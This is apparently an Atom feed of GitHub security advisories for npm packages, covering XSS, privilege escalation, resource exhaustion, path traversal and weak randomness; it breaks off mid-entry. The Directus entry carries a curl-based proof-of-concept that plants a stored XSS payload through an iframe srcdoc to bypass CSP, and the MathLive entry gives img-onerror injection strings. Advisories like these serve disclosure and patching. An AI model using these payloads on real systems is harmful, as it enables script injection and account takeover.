<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-01-27T06:01:35.428Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[store2] Cross Site Scripting vulnerability in store2]]></title>
        <id>https://github.com/advisories/GHSA-w5hq-hm5m-4548</id>
        <link href="https://github.com/advisories/GHSA-w5hq-hm5m-4548"/>
        <updated>2025-01-24T22:33:06.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Scripting vulnerability in nbubna store v.2.14.2 and before allows a remote attacker to execute arbitrary code via the store.deep.js component</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57556">https://nvd.nist.gov/vuln/detail/CVE-2024-57556</a></li>
<li><a href="https://github.com/nbubna/store/issues/127">https://github.com/nbubna/store/issues/127</a></li>
<li><a href="https://github.com/nbubna/store/pull/128">https://github.com/nbubna/store/pull/128</a></li>
<li><a href="https://github.com/advisories/GHSA-w5hq-hm5m-4548">https://github.com/advisories/GHSA-w5hq-hm5m-4548</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w5hq-hm5m-4548</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-24T00:31:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus has a DOM-Based cross-site scripting (XSS) via layout_options]]></title>
        <id>https://github.com/advisories/GHSA-9qrm-48qf-r2rw</id>
        <link href="https://github.com/advisories/GHSA-9qrm-48qf-r2rw"/>
        <updated>2025-01-23T22:36:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Directus allows an authenticated attacker to save cross site scripting code to the database. This is possible because the application injects an attacker-controlled parameter that will be stored in the server and used by the client into an unsanitized DOM element. When chained with <a href="https://github.com/directus/directus/security/advisories/GHSA-3fff-gqw3-vj86">CVE-2024-6534</a>, it could result in account takeover.</p>
<h3 id="poc">PoC</h3>
<p>To exploit this vulnerability, we need to do the following steps using a non-administrative, default role attacker account.</p>
<ol>
<li>Upload the following JavaScript file.</li>
</ol>
<p>Using the upload functionality at <code>POST /files</code>. This PoC will show an alert message.</p>
<pre><code class="language-js">export TARGET_HOST="http://localhost:8055"
export ATTACKER_EMAIL="malicious@malicious.com"
export ATTACKER_PASSWORD="123456"
root_dir=$(dirname $0)
mkdir "${root_dir}/static"

curl -s -k -o /dev/null -w "%{http_code}" -X 'POST' "${TARGET_HOST}/auth/login" \
    -c "${root_dir}/static/attacker_directus_session_token" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"${ATTACKER_EMAIL}\",\"password\":\"${ATTACKER_PASSWORD}\",\"mode\":\"session\"}"

id_url_file=$(echo "alert('Successful DOM-based XSS')" |
  curl -s -k -X 'POST' "${TARGET_HOST}/files" \
    -b "${root_dir}/static/attacker_directus_session_token" \
    -F "file=@-;type=application/x-javascript;filename=poc.js" | jq -r ".data.id")
</code></pre>
<ol start="2">
<li>Create a preset for a collection and store the preset ID.</li>
</ol>
<p>Or use a preset already created from GET /presets. The following example uses the direct_users preset.</p>
<pre><code>attacker_user_id=$(curl -s -k "${TARGET_HOST}/users/me" \ -b "${root_dir}/static/attacker_directus_session_token" | jq -r ".data.id") curl -i -s -k -X 'POST' "${TARGET_HOST}/presets" \ -H 'Content-Type: application/json' \ -b "${root_dir}/static/attacker_directus_session_token" \ --data-binary "{\"layout\":\"cards\",\"bookmark\":null,\"role\":null,\"user\":\"${attacker_user_id}\",\"search\":null,\"filter\":null,\"layout_query\":{\"cards\":{\"sort\":[\"email\"]}},\"layout_options\":{\"cards\":{\"icon\":\"account_circle\",\"title\":\"&lt;iframe srcdoc=\\\"&lt;script src='http://localhost:8055/assets/${id_url_file}'&gt; &lt;/script&gt;\\\"&gt;\",\"subtitle\":\"{{ email }}\",\"size\":4}},\"refresh_interval\":null,\"icon\":\"bookmark\",\"color\":null,\"collection\":\"directus_users\"}"
</code></pre>
<p>When the user visits the view that uses the directus_users preset, the JavaScript file will be executed.</p>
<p>Notes:</p>
<p>Need to use an iframe to execute the malicious JavaScript file to bypass the CSP policies. The payload structure is <code>&lt;iframe srcdoc=\"&lt;script src='URL_MALICIOUS_FILE'&gt; &lt;/script&gt;\"&gt;</code>.</p>
<p>We can target any collection that uses the vulnerable template structure that renders the layout option section.</p>
<p>In this PoC, the target is the same user who sends the payload, but if the attacking user has permission to modify or create presets for other users or even if he does not have permissions but can chain with CVE-2024-6534, he can achieve an account takeover.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-9qrm-48qf-r2rw">https://github.com/directus/directus/security/advisories/GHSA-9qrm-48qf-r2rw</a></li>
<li><a href="https://github.com/advisories/GHSA-9qrm-48qf-r2rw">https://github.com/advisories/GHSA-9qrm-48qf-r2rw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9qrm-48qf-r2rw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-01-23T22:36:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus allows privilege escalation using Share feature]]></title>
        <id>https://github.com/advisories/GHSA-pmf4-v838-29hg</id>
        <link href="https://github.com/advisories/GHSA-pmf4-v838-29hg"/>
        <updated>2025-01-23T22:35:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When sharing an item, user can specify an arbitrary role. It allows user to use a higher-privileged role to see fields that otherwise the user should not be able to see.</p>
<h3 id="details">Details</h3>
<p>Specifying <code>role</code> on share should be available only for admins. The current flow has a security flaw.</p>
<p>Each other role should allow to share only in the context of the same role. As there is no role hierarchy in Directus, it is impossible to tell which role is <em>higher</em> or <em>lower</em>, so only admins should be able to specify the role for share.</p>
<p>Optionally, instead of specifying a role, shareer* should be able to specify which fields (limited to fields shareer sees) are available on shared item. Similarily to import.</p>
<p>*<em>shareer</em> - a person that creates a share link to item</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create a collection with a secret field. </li>
<li>Create role A that sees the secret field</li>
<li>Create role B that does not see the secret field, but can use share feature.</li>
<li>Create item with secret field filled. </li>
<li>Use account with role B to share the object as role A and gain unauthorized access to secret value.</li>
</ol>
<p>Here's video example: <a href="https://www.youtube.com/watch?v=DbV4IxbWzN4">https://www.youtube.com/watch?v=DbV4IxbWzN4</a>
I had to upload it to YouTube, because GitHub allows only 10MB videos.</p>
<h3 id="impact">Impact</h3>
<p>Impacted are instances that use the share feature and have specific roles hierarchy and fields that are not visible for certain roles.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-pmf4-v838-29hg">https://github.com/directus/directus/security/advisories/GHSA-pmf4-v838-29hg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24353">https://nvd.nist.gov/vuln/detail/CVE-2025-24353</a></li>
<li><a href="https://github.com/directus/directus/pull/23716">https://github.com/directus/directus/pull/23716</a></li>
<li><a href="https://github.com/directus/directus/commit/e288a43a79613dada905da683f4919c6965ac804">https://github.com/directus/directus/commit/e288a43a79613dada905da683f4919c6965ac804</a></li>
<li><a href="https://github.com/directus/directus/releases/tag/v11.2.0">https://github.com/directus/directus/releases/tag/v11.2.0</a></li>
<li><a href="https://www.youtube.com/watch?v=DbV4IxbWzN4">https://www.youtube.com/watch?v=DbV4IxbWzN4</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf4-v838-29hg">https://github.com/advisories/GHSA-pmf4-v838-29hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf4-v838-29hg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-23T22:35:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fastify/multipart] Unlimited consumption of resources in @fastify/multipart]]></title>
        <id>https://github.com/advisories/GHSA-27c6-mcxv-x3fh</id>
        <link href="https://github.com/advisories/GHSA-27c6-mcxv-x3fh"/>
        <updated>2025-01-23T23:17:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>saveRequestFiles</code> function does not delete the uploaded temporary files when user cancels the request.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in version 8.3.1 and 9.0.3</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not use <code>saveRequestFiles</code>.</p>
<h3 id="references">References</h3>
<p>This was identified in <a href="https://github.com/fastify/fastify-multipart/issues/546">https://github.com/fastify/fastify-multipart/issues/546</a> and fixed in <a href="https://github.com/fastify/fastify-multipart/pull/567">https://github.com/fastify/fastify-multipart/pull/567</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh">https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh</a></li>
<li><a href="https://github.com/fastify/fastify-multipart/issues/546">https://github.com/fastify/fastify-multipart/issues/546</a></li>
<li><a href="https://github.com/fastify/fastify-multipart/pull/567">https://github.com/fastify/fastify-multipart/pull/567</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24033">https://nvd.nist.gov/vuln/detail/CVE-2025-24033</a></li>
<li><a href="https://github.com/advisories/GHSA-27c6-mcxv-x3fh">https://github.com/advisories/GHSA-27c6-mcxv-x3fh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-27c6-mcxv-x3fh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-23T18:02:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fastify/multipart] Unlimited consumption of resources in @fastify/multipart]]></title>
        <id>https://github.com/advisories/GHSA-27c6-mcxv-x3fh</id>
        <link href="https://github.com/advisories/GHSA-27c6-mcxv-x3fh"/>
        <updated>2025-01-23T23:17:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>saveRequestFiles</code> function does not delete the uploaded temporary files when user cancels the request.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in version 8.3.1 and 9.0.3</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not use <code>saveRequestFiles</code>.</p>
<h3 id="references">References</h3>
<p>This was identified in <a href="https://github.com/fastify/fastify-multipart/issues/546">https://github.com/fastify/fastify-multipart/issues/546</a> and fixed in <a href="https://github.com/fastify/fastify-multipart/pull/567">https://github.com/fastify/fastify-multipart/pull/567</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh">https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh</a></li>
<li><a href="https://github.com/fastify/fastify-multipart/issues/546">https://github.com/fastify/fastify-multipart/issues/546</a></li>
<li><a href="https://github.com/fastify/fastify-multipart/pull/567">https://github.com/fastify/fastify-multipart/pull/567</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24033">https://nvd.nist.gov/vuln/detail/CVE-2025-24033</a></li>
<li><a href="https://github.com/advisories/GHSA-27c6-mcxv-x3fh">https://github.com/advisories/GHSA-27c6-mcxv-x3fh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-27c6-mcxv-x3fh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-23T18:02:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@actions/artifact] @actions/artifact has an Arbitrary File Write via artifact extraction]]></title>
        <id>https://github.com/advisories/GHSA-6q32-hq47-5qq3</id>
        <link href="https://github.com/advisories/GHSA-6q32-hq47-5qq3"/>
        <updated>2025-01-22T18:45:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Versions of <code>actions/artifact</code> before 2.1.7 are vulnerable to arbitrary file write when using <code>downloadArtifactInternal</code>, <code>downloadArtifactPublic</code>, or <code>streamExtractExternal</code> for extracting a specifically crafted artifact that contains path traversal filenames.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to version 2.1.7 or higher. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://snyk.io/research/zip-slip-vulnerability">https://snyk.io/research/zip-slip-vulnerability</a></li>
<li><a href="https://github.com/actions/toolkit/pull/1724">https://github.com/actions/toolkit/pull/1724</a></li>
</ul>
<h3 id="cve">CVE</h3>
<p>CVE-2024-42471</p>
<h3 id="credits">Credits</h3>
<p>Justin Taft from Google</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/actions/toolkit/security/advisories/GHSA-6q32-hq47-5qq3">https://github.com/actions/toolkit/security/advisories/GHSA-6q32-hq47-5qq3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42471">https://nvd.nist.gov/vuln/detail/CVE-2024-42471</a></li>
<li><a href="https://github.com/actions/toolkit/pull/1724">https://github.com/actions/toolkit/pull/1724</a></li>
<li><a href="https://github.com/actions/toolkit/commit/29885a805ef3e95a9862dcaa8431c30981960017">https://github.com/actions/toolkit/commit/29885a805ef3e95a9862dcaa8431c30981960017</a></li>
<li><a href="https://snyk.io/research/zip-slip-vulnerability">https://snyk.io/research/zip-slip-vulnerability</a></li>
<li><a href="https://github.com/actions/toolkit/pull/1602">https://github.com/actions/toolkit/pull/1602</a></li>
<li><a href="https://github.com/actions/download-artifact/blob/v3/package.json#L31">https://github.com/actions/download-artifact/blob/v3/package.json#L31</a></li>
<li><a href="https://github.com/actions/toolkit/pull/1666">https://github.com/actions/toolkit/pull/1666</a></li>
<li><a href="https://github.com/advisories/GHSA-6q32-hq47-5qq3">https://github.com/advisories/GHSA-6q32-hq47-5qq3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q32-hq47-5qq3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T20:08:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mathlive] MathLive's Lack of Escaping of HTML allows for XSS]]></title>
        <id>https://github.com/advisories/GHSA-qwj6-q94f-8425</id>
        <link href="https://github.com/advisories/GHSA-qwj6-q94f-8425"/>
        <updated>2025-01-21T21:17:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Despite normal text rendering as LaTeX expressions, preventing XSS, the library also provides users with commands which may modify HTML, such as the <code>\htmlData</code> command, and the lack of escaping leads to XSS.</p>
<h3 id="details">Details</h3>
<p>Overall in the code, other than in the <code>test</code> folder, no functions escaping HTML can be seen.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Go to <a href="https://cortexjs.io/mathlive/demo/">https://cortexjs.io/mathlive/demo/</a></li>
<li>Paste either <code>\htmlData{&gt;&lt;img/onerror=alert(1)"src=}{}</code> or <code>\htmlData{x=" &gt;&lt;img/onerror=alert(1) src&gt;}{}</code> in the LaTeX textarea.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>MathLive users who render untrusted mathematical expressions could encounter malicious input using \htmlData that runs arbitrary JavaScript, or generate invalid HTML.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/arnog/mathlive/security/advisories/GHSA-qwj6-q94f-8425">https://github.com/arnog/mathlive/security/advisories/GHSA-qwj6-q94f-8425</a></li>
<li><a href="https://github.com/arnog/mathlive/commit/abc26056fd5e29a99edfa96a0bbe855ea2a8b678">https://github.com/arnog/mathlive/commit/abc26056fd5e29a99edfa96a0bbe855ea2a8b678</a></li>
<li><a href="https://github.com/advisories/GHSA-qwj6-q94f-8425">https://github.com/advisories/GHSA-qwj6-q94f-8425</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qwj6-q94f-8425</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T21:17:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[undici] Use of Insufficiently Random Values in undici]]></title>
        <id>https://github.com/advisories/GHSA-c76h-2ccp-4975</id>
        <link href="https://github.com/advisories/GHSA-c76h-2ccp-4975"/>
        <updated>2025-01-22T08:01:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><a href="https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113">Undici <code>fetch()</code> uses Math.random()</a> to choose the boundary for a multipart/form-data request. It is known that the output of Math.random() can be predicted if several of its generated values are known.</p>
<p>If there is a mechanism in an app that sends multipart requests to an attacker-controlled website, they can use this to leak the necessary values. Therefore, An attacker can tamper with the requests going to the backend APIs if certain conditions are met.</p>
<h3 id="patches">Patches</h3>
<p>This is fixed in 5.28.5; 6.21.1; 7.2.3.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not issue multipart requests to attacker controlled servers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://hackerone.com/reports/2913312">https://hackerone.com/reports/2913312</a></li>
<li><a href="https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f">https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-c76h-2ccp-4975">https://github.com/nodejs/undici/security/advisories/GHSA-c76h-2ccp-4975</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-22150">https://nvd.nist.gov/vuln/detail/CVE-2025-22150</a></li>
<li><a href="https://github.com/nodejs/undici/commit/711e20772764c29f6622ddc937c63b6eefdf07d0">https://github.com/nodejs/undici/commit/711e20772764c29f6622ddc937c63b6eefdf07d0</a></li>
<li><a href="https://github.com/nodejs/undici/commit/c2d78cd19fe4f4c621424491e26ce299e65e934a">https://github.com/nodejs/undici/commit/c2d78cd19fe4f4c621424491e26ce299e65e934a</a></li>
<li><a href="https://github.com/nodejs/undici/commit/c3acc6050b781b827d80c86cbbab34f14458d385">https://github.com/nodejs/undici/commit/c3acc6050b781b827d80c86cbbab34f14458d385</a></li>
<li><a href="https://hackerone.com/reports/2913312">https://hackerone.com/reports/2913312</a></li>
<li><a href="https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f">https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f</a></li>
<li><a href="https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113">https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113</a></li>
<li><a href="https://github.com/advisories/GHSA-c76h-2ccp-4975">https://github.com/advisories/GHSA-c76h-2ccp-4975</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c76h-2ccp-4975</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T21:10:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[undici] Use of Insufficiently Random Values in undici]]></title>
        <id>https://github.com/advisories/GHSA-c76h-2ccp-4975</id>
        <link href="https://github.com/advisories/GHSA-c76h-2ccp-4975"/>
        <updated>2025-01-22T08:01:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><a href="https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113">Undici <code>fetch()</code> uses Math.random()</a> to choose the boundary for a multipart/form-data request. It is known that the output of Math.random() can be predicted if several of its generated values are known.</p>
<p>If there is a mechanism in an app that sends multipart requests to an attacker-controlled website, they can use this to leak the necessary values. Therefore, An attacker can tamper with the requests going to the backend APIs if certain conditions are met.</p>
<h3 id="patches">Patches</h3>
<p>This is fixed in 5.28.5; 6.21.1; 7.2.3.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not issue multipart requests to attacker controlled servers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://hackerone.com/reports/2913312">https://hackerone.com/reports/2913312</a></li>
<li><a href="https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f">https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-c76h-2ccp-4975">https://github.com/nodejs/undici/security/advisories/GHSA-c76h-2ccp-4975</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-22150">https://nvd.nist.gov/vuln/detail/CVE-2025-22150</a></li>
<li><a href="https://github.com/nodejs/undici/commit/711e20772764c29f6622ddc937c63b6eefdf07d0">https://github.com/nodejs/undici/commit/711e20772764c29f6622ddc937c63b6eefdf07d0</a></li>
<li><a href="https://github.com/nodejs/undici/commit/c2d78cd19fe4f4c621424491e26ce299e65e934a">https://github.com/nodejs/undici/commit/c2d78cd19fe4f4c621424491e26ce299e65e934a</a></li>
<li><a href="https://github.com/nodejs/undici/commit/c3acc6050b781b827d80c86cbbab34f14458d385">https://github.com/nodejs/undici/commit/c3acc6050b781b827d80c86cbbab34f14458d385</a></li>
<li><a href="https://hackerone.com/reports/2913312">https://hackerone.com/reports/2913312</a></li>
<li><a href="https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f">https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f</a></li>
<li><a href="https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113">https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113</a></li>
<li><a href="https://github.com/advisories/GHSA-c76h-2ccp-4975">https://github.com/advisories/GHSA-c76h-2ccp-4975</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c76h-2ccp-4975</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T21:10:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[undici] Use of Insufficiently Random Values in undici]]></title>
        <id>https://github.com/advisories/GHSA-c76h-2ccp-4975</id>
        <link href="https://github.com/advisories/GHSA-c76h-2ccp-4975"/>
        <updated>2025-01-22T08:01:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><a href="https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113">Undici <code>fetch()</code> uses Math.random()</a> to choose the boundary for a multipart/form-data request. It is known that the output of Math.random() can be predicted if several of its generated values are known.</p>
<p>If there is a mechanism in an app that sends multipart requests to an attacker-controlled website, they can use this to leak the necessary values. Therefore, An attacker can tamper with the requests going to the backend APIs if certain conditions are met.</p>
<h3 id="patches">Patches</h3>
<p>This is fixed in 5.28.5; 6.21.1; 7.2.3.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not issue multipart requests to attacker controlled servers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://hackerone.com/reports/2913312">https://hackerone.com/reports/2913312</a></li>
<li><a href="https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f">https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-c76h-2ccp-4975">https://github.com/nodejs/undici/security/advisories/GHSA-c76h-2ccp-4975</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-22150">https://nvd.nist.gov/vuln/detail/CVE-2025-22150</a></li>
<li><a href="https://github.com/nodejs/undici/commit/711e20772764c29f6622ddc937c63b6eefdf07d0">https://github.com/nodejs/undici/commit/711e20772764c29f6622ddc937c63b6eefdf07d0</a></li>
<li><a href="https://github.com/nodejs/undici/commit/c2d78cd19fe4f4c621424491e26ce299e65e934a">https://github.com/nodejs/undici/commit/c2d78cd19fe4f4c621424491e26ce299e65e934a</a></li>
<li><a href="https://github.com/nodejs/undici/commit/c3acc6050b781b827d80c86cbbab34f14458d385">https://github.com/nodejs/undici/commit/c3acc6050b781b827d80c86cbbab34f14458d385</a></li>
<li><a href="https://hackerone.com/reports/2913312">https://hackerone.com/reports/2913312</a></li>
<li><a href="https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f">https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f</a></li>
<li><a href="https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113">https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113</a></li>
<li><a href="https://github.com/advisories/GHSA-c76h-2ccp-4975">https://github.com/advisories/GHSA-c76h-2ccp-4975</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c76h-2ccp-4975</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T21:10:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@umbraco-cms/backoffice] XSS/HTML Injection Vulnerability in Umbraco Backoffice Components]]></title>
        <id>https://github.com/advisories/GHSA-wv8v-rmw2-25wc</id>
        <link href="https://github.com/advisories/GHSA-wv8v-rmw2-25wc"/>
        <updated>2025-01-21T19:59:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Authenticated users are able to exploit an XSS vulnerability when viewing certain localized backoffice components.</p>
<h3 id="patches">Patches</h3>
<p>Will be patched in 14.3.2 and 15.1.2.</p>
<p>Note:
This issue was reported by Pratik Patil from NetSPI @Nexusss-ppatil</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc">https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24012">https://nvd.nist.gov/vuln/detail/CVE-2025-24012</a></li>
<li><a href="https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2">https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2</a></li>
<li><a href="https://github.com/advisories/GHSA-wv8v-rmw2-25wc">https://github.com/advisories/GHSA-wv8v-rmw2-25wc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wv8v-rmw2-25wc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T19:59:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@umbraco-cms/backoffice] XSS/HTML Injection Vulnerability in Umbraco Backoffice Components]]></title>
        <id>https://github.com/advisories/GHSA-wv8v-rmw2-25wc</id>
        <link href="https://github.com/advisories/GHSA-wv8v-rmw2-25wc"/>
        <updated>2025-01-21T19:59:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Authenticated users are able to exploit an XSS vulnerability when viewing certain localized backoffice components.</p>
<h3 id="patches">Patches</h3>
<p>Will be patched in 14.3.2 and 15.1.2.</p>
<p>Note:
This issue was reported by Pratik Patil from NetSPI @Nexusss-ppatil</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc">https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24012">https://nvd.nist.gov/vuln/detail/CVE-2025-24012</a></li>
<li><a href="https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2">https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2</a></li>
<li><a href="https://github.com/advisories/GHSA-wv8v-rmw2-25wc">https://github.com/advisories/GHSA-wv8v-rmw2-25wc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wv8v-rmw2-25wc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T19:59:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify/fedify]]></title>
